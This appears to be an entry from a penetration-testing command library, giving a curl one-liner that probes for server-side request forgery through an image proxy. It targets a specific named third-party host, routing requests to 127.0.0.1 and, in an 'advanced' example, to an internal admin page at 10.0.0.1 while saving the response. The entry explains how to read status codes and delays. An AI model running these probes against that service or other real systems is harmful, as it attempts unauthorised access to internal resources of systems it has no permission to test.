---
id: cmd-uuid-001
data: >-
  curl -s -w "%{http_code} %{time_total}s"
  "https://camo.stream.highwebmedia.com/http://127.0.0.1/" -o /dev/null
tags:
  - ssrf
  - testing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:18.612Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-image-proxy-test

## Command

```bash
curl -s -w "%{http_code} %{time_total}s" "https://camo.stream.highwebmedia.com/http://127.0.0.1/" -o /dev/null
```

## Description

This command tests for SSRF in an image proxy by sending a request to an internal endpoint (e.g., localhost) via the proxy URL. It suppresses verbose output (-s), writes headers for status and timing (-w), and discards the body (-o /dev/null). Use it to detect blind SSRF through response codes and delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| `-w "%{http_code} %{time_total}s"` | Custom output for HTTP status and total time | Yes |
| URL argument | Proxied internal URL (e.g., http://127.0.0.1/) | Yes |
| `-o /dev/null` | Discard response body | Yes |

## Examples

### Basic Usage

```bash
curl -s -w "%{http_code} %{time_total}s" "https://camo.stream.highwebmedia.com/http://127.0.0.1/" -o /dev/null
```

### Advanced Usage

```bash
curl -s -w "%{http_code} %{time_total}s %{size_download}" "https://camo.stream.highwebmedia.com/https://10.0.0.1/admin" -o response.html
```

## Expected Output

Successful execution might output: "200 2.5s" indicating a 200 OK with a 2.5-second delay, suggesting internal request processing. Errors like "403 0.1s" could indicate blocking, while delays confirm potential SSRF.

## Related

- [[Related Procedure|procedures/Exploit-Blind-SSRF-in-Image-Proxy]]
